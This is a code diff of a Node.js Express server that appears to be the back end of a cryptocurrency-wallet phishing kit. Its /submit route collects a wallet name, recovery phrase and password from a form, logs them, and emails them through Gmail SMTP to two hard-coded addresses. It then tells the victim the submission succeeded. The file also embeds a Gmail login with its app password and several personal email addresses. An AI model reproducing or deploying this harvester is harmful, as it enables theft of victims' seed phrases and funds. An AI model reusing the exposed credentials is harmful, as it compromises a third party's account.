@@ -1,45 +1,41 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const multer = require('multer');
+const bodyParser = require('body-parser');
 const path = require('path');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000;
 
-// Multer for handling multipart/form-data
-const upload = multer();
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-// Serve static files
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
-// List of recipient email addresses
 const maillist = [
   'Divasnow178@gmail.com',
   'rf7765272@gmail.com',
 ];
 
-// Create nodemailer transporter
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
   port: 465,
   secure: true,
   auth: {
-    user: "hello.jonathanpius@gmail.com",
-    pass: "rbenxiivasedcnaw",
-    // ⚠️ IMPORTANT: Use environment variables for email credentials in production
+    user: process.env.EMAIL_USER || "hello.jonathanpius@gmail.com",
+    pass: process.env.EMAIL_PASS || "rbenxiivasedcnaw",
   },
 });
 
-// Route to handle form submission
-app.post('/submit', upload.none(), async (req, res) => {
-  try {
-    // Extract form data
-    const { walletName, phraseWallet, passwordWallet, send } = req.body;
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'app.html'));
+});
 
-    // Check if this is a valid submission
-    if (send !== 'true') {
-      return res.status(400).send('Invalid submission');
-    }
+app.post('/submit', async (req, res) => {
+  try {
+    console.log('Submission received:', req.body);
+
+    // Extract form data
+    const { walletName, phraseWallet, passwordWallet } = req.body;
 
     // Prepare email options
     const mailOptions = {
@@ -61,7 +57,6 @@ app.post('/submit', upload.none(), async (req, res) => {
     console.log('Accepted:', info.accepted);
     console.log('Rejected:', info.rejected);
 
-    // Send response back to client
     res.status(200).send('Wallet details submitted successfully');
   } catch (error) {
     console.error('Error sending email:', error);
@@ -69,12 +64,8 @@ app.post('/submit', upload.none(), async (req, res) => {
   }
 });
 
-// Serve the HTML file
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Start the server
 app.listen(port, () => {
   console.log(`Server running at http://localhost:${port}`);
 });
+
+module.exports = app;
